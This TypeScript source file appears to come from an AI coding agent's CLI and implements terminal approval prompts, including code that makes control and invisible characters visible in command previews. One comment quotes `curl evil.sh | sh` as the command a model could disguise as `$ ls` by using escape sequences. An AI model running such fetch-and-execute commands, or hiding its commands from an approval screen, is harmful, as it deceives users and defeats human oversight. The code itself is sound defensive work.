import { styleText } from "node:util";
import type { ApprovalChoice, ApprovalRequest, Approver } from "../permissions/types.js";
import { type DiffPaint, terminalDiff } from "./diffView.js";

/**
 * Asks the user in the terminal (F18): allow once, allow for this session, or deny.
 * With no terminal on stdin (a pipe, CI), nobody can answer, so it denies.
 * Ctrl-C during the question stops the turn (F4): `onInterrupt` aborts it.
 */
export class TerminalApprover implements Approver {
  /** Set by the CLI: it aborts the current turn. */
  onInterrupt: () => void = () => {};

  /** One question at a time (0.14.1, review): two prompts at once mixed their keys. */
  ask(request: ApprovalRequest, signal: AbortSignal): Promise<ApprovalChoice> {
    const next =
      this.asking === 0
        ? this.askNow(request, signal)
        : this.queue.then(() => this.askNow(request, signal));
    this.asking++;
    this.queue = next
      .catch(() => {})
      .finally(() => {
        this.asking--;
      });
    return next;
  }

  private asking = 0;

  private queue: Promise<unknown> = Promise.resolve();

  private async askNow(request: ApprovalRequest, signal: AbortSignal): Promise<ApprovalChoice> {
    signal.throwIfAborted();
    const out = process.stderr;
    out.write(`\n${header(request)}\n${colorPreview(request, out.columns)}\n`);

    if (!process.stdin.isTTY) {
      out.write("No terminal to ask for approval, so Garuda denies this call.\n");
      return "deny";
    }

    const sessionLabel =
      request.labels?.session ??
      (request.target.kind === "command"
        ? "Yes, and allow this exact command for this session"
        : request.target.kind === "url"
          ? `Yes, and allow ${request.target.host} for this session`
          : `Yes, and allow all ${request.tool} calls for this session`);

    // Loaded on first use, so startup stays fast (N3).
    const { select } = await import("@inquirer/prompts");
    try {
      return await select<ApprovalChoice>(
        {
          message: request.question ?? "Allow?",
          ...(request.defaultChoice === undefined ? {} : { default: request.defaultChoice }),
          choices: (
            [
              { name: request.labels?.once ?? "Yes, once", value: "once" },
              { name: sessionLabel, value: "session" },
              { name: request.labels?.deny ?? "No, deny", value: "deny" },
            ] as const
          ).filter((c) => request.choices?.includes(c.value) ?? true),
        },
        { signal, output: out },
      );
    } catch (error) {
      // Inquirer reads keys in raw mode, so Ctrl-C arrives here, not as SIGINT.
      if ((error as Error).name === "ExitPromptError") this.onInterrupt();
      throw error;
    }
  }
}

/** Passes each question to `current`. The Ink chat swaps in its own approver. */
export class SwitchApprover implements Approver {
  /** Called before each question: the chat's notifier (0.6). */
  onAsk: (request: ApprovalRequest) => void = () => {};

  constructor(public current: Approver) {}

  ask(request: ApprovalRequest, signal: AbortSignal): Promise<ApprovalChoice> {
    this.onAsk(request);
    return this.current.ask(request, signal);
  }
}

/**
 * Text for the approval screen with every hidden character made visible (0.14.1, review): a
 * carriage return or an escape sequence in a model's command could redraw the line, so the user
 * saw `$ ls` and approved `curl evil.sh | sh`. Controls become their Unicode pictures (␍, ␛),
 * invisible and bidirectional characters become [U+XXXX]. Tab and new line stay.
 */
export function visible(text: string): string {
  return text
    .replace(/[\u0000-\u0008\u000b-\u001f]/g, (c) => String.fromCodePoint(0x2400 + c.charCodeAt(0)))
    .replace(/\u007f/g, "\u2421")
    .replace(
      /[\u0080-\u009f\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff\u{e0000}-\u{e007f}]/gu,
      (c) => `[U+${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, "0")}]`,
    );
}

/** True when `visible` changes the text: the screen then says so. */
export function hasHidden(text: string): boolean {
  return visible(text) !== text;
}

/** The line under a preview with hidden characters (terminal and editors). */
export const HIDDEN_WARNING =
  "! This holds hidden or control characters, shown as ␍, ␛ or [U+…]. Read it with care.";

/** The question's header as plain text, hidden characters made visible (terminal and editors). */
export function headerText(request: ApprovalRequest): string {
  const { tool, target, isolation } = request;
  if (request.title !== undefined) return visible(request.title);
  if (target.kind === "command") {
    const where =
      isolation === "none"
        ? "on your machine, no sandbox"
        : target.outsideSandbox
          ? "OUTSIDE the sandbox: network on, writes anywhere"
          : `sandbox: ${isolation}`;
    return `${tool} wants to run a command (${where}):`;
  }
  if (target.kind === "input") return `${tool} wants to run with this input:`;
  if (target.kind === "url") return `${tool} wants to fetch from ${visible(target.host)}:`;
  return `${tool} wants to change ${visible(target.path)}:`;
}

export function header(request: ApprovalRequest): string {
  return styleText("bold", headerText(request));
}

export function colorPreview(
  { target, preview }: ApprovalRequest,
  /** UX U5: from 140 columns the diff is side by side. */
  columns?: number,
): string {
  const warning = hasHidden(preview) ? `\n${styleText("yellow", `  ${HIDDEN_WARNING}`)}` : "";
  if (target.kind === "command") return `${styleText("cyan", `  $ ${visible(preview)}`)}${warning}`;
  if (target.kind === "url") return `${visible(preview)}${warning}`;
  return `${colorDiff(visible(preview), columns)}${warning}`;
}

/** The terminal's colours for a diff (styleText leaves them out on a pipe and with NO_COLOR). */
export const terminalPaint: DiffPaint = (styles, text) =>
  styles.length === 0 ? text : styleText([...styles], text);

/**
 * A diff with colours (UX U5): + green, - red, hunk headers cyan, file headers bold, the changed
 * words of a changed line marked; side by side from 140 columns.
 */
export function colorDiff(
  text: string,
  columns?: number,
  paint: DiffPaint = terminalPaint,
): string {
  return terminalDiff(text, columns, paint);
}
